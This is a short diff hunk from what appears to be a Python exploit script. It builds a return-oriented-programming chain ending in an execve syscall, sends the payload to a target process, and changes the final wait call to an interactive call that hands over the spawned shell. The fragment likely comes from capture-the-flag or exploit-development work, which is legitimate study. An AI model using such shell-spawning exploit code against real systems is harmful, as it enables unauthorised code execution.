@@ -43,4 +43,4 @@ buf += rop.syscall(nr_execve, addr_stage+16, addr_stage, 0)
 
 p.write(p32(len(buf)) + buf)
 print "[+] read: %r" % p.read(len(buf))
-p.wait(0)
+p.interact(0)
